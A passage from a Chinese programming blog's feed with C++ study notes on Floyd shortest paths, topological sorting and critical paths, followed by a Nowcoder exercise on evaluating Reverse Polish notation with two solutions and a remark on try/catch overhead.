class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>    <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>    <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>    <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>    <br>    <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> &amp;num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatePairShortPath</span><span class="hljs-params">(AMGraph amGraph)</span> </span>&#123;<br>    std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; weight;<br>    std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; sub;<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        std::vector&lt;<span class="hljs-type">int</span>&gt; temSub;<br>        std::vector&lt;<span class="hljs-type">int</span>&gt; temWei;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            temWei.<span class="hljs-built_in">emplace_back</span>(amGraph.arcs[i][j]);<br>            temSub.<span class="hljs-built_in">emplace_back</span>(j);<br>        &#125;<br>        weight.<span class="hljs-built_in">emplace_back</span>(temWei);<br>        sub.<span class="hljs-built_in">emplace_back</span>(temSub);<br>    &#125;<br>    <br>    <span class="hljs-comment">//核心代码</span><br>    <span class="hljs-comment">//i:中间点</span><br>    <span class="hljs-comment">//j:出发点</span><br>    <span class="hljs-comment">//k:终点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; amGraph.vexnum; ++k) &#123;<br>                <span class="hljs-keyword">if</span> (weight[j][k] &gt; weight[j][i] + weight[i][k]) &#123;<br>                    weight[j][k] = weight[j][i] + weight[i][k];<br>                    sub[j][k] = sub[j][i];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//A-&gt;D</span><br>    <span class="hljs-type">int</span> beginSub = <span class="hljs-number">0</span>, endSub = <span class="hljs-number">3</span>;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;path: &quot;</span> &lt;&lt; amGraph.vexs[beginSub] &lt;&lt; <span class="hljs-string">&quot;  -&gt;  &quot;</span> &lt;&lt; amGraph.vexs[endSub] &lt;&lt; std::endl<br>              &lt;&lt; <span class="hljs-string">&quot; and the weight is &quot;</span> &lt;&lt; weight[beginSub][endSub] &lt;&lt; std::endl;<br>    <span class="hljs-type">int</span> kSub=sub[beginSub][endSub];<br>    std::cout&lt;&lt;amGraph.vexs[beginSub];<br>    <span class="hljs-keyword">while</span> (kSub != endSub) &#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot; -&gt; &quot;</span>&lt;&lt;amGraph.vexs[kSub];<br>        kSub=sub[kSub][endSub];<br>    &#125;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot; -&gt; &quot;</span>&lt;&lt;amGraph.vexs[endSub]&lt;&lt;std::endl;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    AMGraph amGraph;<br>    <span class="hljs-type">int</span> size;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;please input size: &quot;</span>;<br>    std::cin &gt;&gt; size;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, size);<br>    <span class="hljs-built_in">CreatePairShortPath</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="有向无环图"><a href="#有向无环图" class="headerlink" title="有向无环图"></a>有向无环图</h2><ol><li><p><code>AOV</code>网 -&gt; 拓扑排序问题</p><p>使用一个有向图表示一个工程。定点表示活动 。使用弧长表示不同活动的先后关系</p></li><li><p><code>AOE</code>网 -&gt; 关键路径问题</p><p>使用弧表示活动，使用定点表示活动开始或者结束的事件</p></li></ol><h3 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h3><ol><li><p>用处：</p><p>所有的顶点都在拓扑序列当中则说明是没有环，反之有环</p></li><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    std::vector&lt;VerTexType&gt; vexs; <span class="hljs-comment">//顶点表</span><br>    std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; arcs; <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br><br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Edge</span> &#123;<br>    VerTexType nextValue;<br>    <span class="hljs-type">int</span> sub;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AdjacencyList</span> &#123;<br>    std::list&lt;std::shared_ptr&lt;Edge&gt;&gt; nextPoint;<br>    VerTexType vex;<br>    <span class="hljs-type">int</span> in;<br>    <span class="hljs-built_in">AdjacencyList</span>():<span class="hljs-built_in">vex</span>(<span class="hljs-string">&#x27;0&#x27;</span>),<span class="hljs-built_in">in</span>(<span class="hljs-number">0</span>)&#123;&#125;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> &amp;num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs.<span class="hljs-built_in">emplace_back</span>(i + <span class="hljs-string">&#x27;A&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        std::vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>        amGraph.arcs.<span class="hljs-built_in">emplace_back</span>(vec);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            <span class="hljs-type">int</span> tem;<br>            std::cin &gt;&gt; tem;<br>            amGraph.arcs[i].<span class="hljs-built_in">emplace_back</span>(tem);<br>            <span class="hljs-keyword">if</span>(tem!=<span class="hljs-number">0</span>&amp;&amp;tem!=MaxInt)&#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateAdjacencyList</span><span class="hljs-params">(<span class="hljs-type">const</span> AMGraph &amp;amGraph, std::vector&lt;AdjacencyList&gt;&amp; adjacencyList)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        AdjacencyList tem;<br>        tem.vex=amGraph.vexs[i];<br>        adjacencyList.<span class="hljs-built_in">emplace_back</span>(tem);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(amGraph.arcs[i][j]!=<span class="hljs-number">0</span>&amp;&amp;amGraph.arcs[i][j]!=MaxInt)&#123;<br>                <span class="hljs-function">std::shared_ptr&lt;Edge&gt; <span class="hljs-title">pEdge</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Edge)</span></span>;<br>                pEdge-&gt;sub=j;<br>                pEdge-&gt;nextValue=amGraph.vexs[j];<br>                adjacencyList[i].nextPoint.<span class="hljs-built_in">push_back</span>(pEdge);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(amGraph.arcs[i][j]!=<span class="hljs-number">0</span>)&#123;  <br>                adjacencyList[j].in++;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SopologicalSort</span><span class="hljs-params">(std::vector&lt;AdjacencyList&gt;&amp; adjacencyLists)</span></span>&#123;<br>    std::stack&lt;AdjacencyList&gt; stack;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; adjacencyLists.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-keyword">if</span>(adjacencyLists[i].in==<span class="hljs-number">0</span>)&#123;<br>            stack.<span class="hljs-built_in">push</span>(adjacencyLists[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(!stack.<span class="hljs-built_in">empty</span>())&#123;<br>        <span class="hljs-keyword">auto</span> tem=stack.<span class="hljs-built_in">top</span>();<br>        std::cout&lt;&lt;tem.vex&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>;<br>        i++;<br>        stack.<span class="hljs-built_in">pop</span>();<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;item:tem.nextPoint)&#123;<br>            <span class="hljs-keyword">if</span>(!--adjacencyLists[item-&gt;sub].in)&#123;<br>                stack.<span class="hljs-built_in">push</span>(adjacencyLists[item-&gt;sub]);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    std::cout&lt;&lt;std::endl&lt;&lt;<span class="hljs-string">&quot;size: &quot;</span>&lt;&lt;i&lt;&lt;std::endl;<br>    <span class="hljs-keyword">if</span>(i==adjacencyLists.<span class="hljs-built_in">size</span>())&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    AMGraph amGraph;  <span class="hljs-comment">//图，以及邻接矩阵</span><br>    std::vector&lt;AdjacencyList&gt; adjacencyList;<br>    <span class="hljs-type">int</span> size;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;input size: &quot;</span>&lt;&lt;std::endl;<br>    std::cin &gt;&gt; size;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, size);<br>    <span class="hljs-built_in">CreateAdjacencyList</span>(amGraph,adjacencyList);<br>    std::cout&lt;&lt;<span class="hljs-built_in">SopologicalSort</span>(adjacencyList);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure></li></ol><h3 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h3><ol><li><p>结点</p><p><code>ve(i,j)</code>表示事件<code>i,j</code>最早发生的时间</p><p><code>vl(v,j)</code>表示事情最迟的发生时间</p></li><li><p>边</p><p><code>e(a3)</code>表示活动最早的开始时间</p><p><code>l(a3)</code>表示活动最迟的开始时间</p><p><code>l(a3)-e(a3)</code>表示完成 <code>a3</code>的时间余量</p><p>若<code>e()==i()</code>则说明是路径上关键活动</p></li><li><p>部分公式 </p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84%E7%9A%84%E5%85%AC%E5%BC%8F.jpg"></p><p>活动<code>i</code>发生的最早时间，等于时间<code>j</code>的最晚发生时间</p><p>活动<code>i</code>最晚发生时间，等于<code>k</code>的最晚发生时间</p></li><li><p>求关键路径</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆波兰表达式求值</title>
    <link href="/2023/04/19/%E7%AE%97%E6%B3%95/newcoder/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/"/>
    <url>/2023/04/19/%E7%AE%97%E6%B3%95/newcoder/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/885c1db3e39040cbae5cdf59fb0e9382?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">逆波兰表达式求值_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC.png"></p><ol><li><p>代码</p><p>自己的版本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * @param tokens string字符串vector </span><br><span class="hljs-comment">     * @return int整型</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">evalRPN</span><span class="hljs-params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        stack&lt;<span class="hljs-type">int</span>&gt; stack;<br>        <span class="hljs-type">int</span> num;<br>        <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<span class="hljs-comment">//return</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item:tokens)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                num=std::<span class="hljs-built_in">stoi</span>(item.<span class="hljs-built_in">data</span>());<br>                stack.<span class="hljs-built_in">push</span>(num);<br>            &#125;<span class="hljs-built_in">catch</span> (...)&#123;<br>                <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;+&quot;</span>)&#123;<br>                    num=stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    sum=stack.<span class="hljs-built_in">top</span>()+num;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(sum);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;-&quot;</span>)&#123;<br>                    num=stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    sum=stack.<span class="hljs-built_in">top</span>()-num;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(sum);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;*&quot;</span>)&#123;<br>                    num=stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    sum=num*stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(sum);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;/&quot;</span>)&#123;<br>                    num=stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    sum=stack.<span class="hljs-built_in">top</span>()/num;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(sum);<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                    cout&lt;&lt;<span class="hljs-string">&quot;input error&quot;</span>&lt;&lt;endl;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">top</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 存在的问题是，选择太太多了，代码冗长</span><br><span class="hljs-comment"> * try,catch的性能消耗过大</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>答案</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param tokens string字符串vector</span><br><span class="hljs-comment">     * @return int整型</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">evalRPN</span><span class="hljs-params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        stack&lt;<span class="hljs-type">int</span>&gt; stack;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item: tokens)&#123;<br>            <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;+&quot;</span>||item==<span class="hljs-string">&quot;-&quot;</span>||item==<span class="hljs-string">&quot;*&quot;</span>||item==<span class="hljs-string">&quot;/&quot;</span>)&#123;<br>                <span class="hljs-type">int</span> num=stack.<span class="hljs-built_in">top</span>();<br>                stack.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-type">int</span> num2=stack.<span class="hljs-built_in">top</span>();<br>                stack.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;+&quot;</span>)&#123;<br>                    stack.<span class="hljs-built_in">push</span>(num2+num);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;-&quot;</span>)&#123;<br>                    stack.<span class="hljs-built_in">push</span>(num2-num);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;*&quot;</span>)&#123;<br>                    stack.<span class="hljs-built_in">push</span>(num*num2);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;/&quot;</span>)&#123;<br>                    stack.<span class="hljs-built_in">push</span>(num2/num);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                stack.<span class="hljs-built_in">push</span>(std::<span class="hljs-built_in">stoi</span>(item));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">top</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC%E6%8F%90%E7%A4%BA.gif"></p></li><li><p>理解</p><ul><li>通过压栈存放临时数据</li></ul></li><li><p>问题</p><ul><li><p>为什么<code>try``catch</code>语句，性能消耗大？</p><blockquote><p>使用 <code>try</code> 和 <code>catch</code> 可以在程序运行时捕获并处理异常。然而，由于异常处理需要额外的开销，如果在代码中频繁地使用 <code>try</code> 和 <code>catch</code>，会对程序的性能产生影响。</p><p>具体来说，当程序出现异常时，C++ 运行时系统需要在堆栈上创建一个异常对象，并执行一系列系统调用来查找匹配的 <code>catch</code> 块。这个过程需要进行堆栈展开（stack unwinding），将程序从异常抛出点回退到能够处理异常的 <code>catch</code> 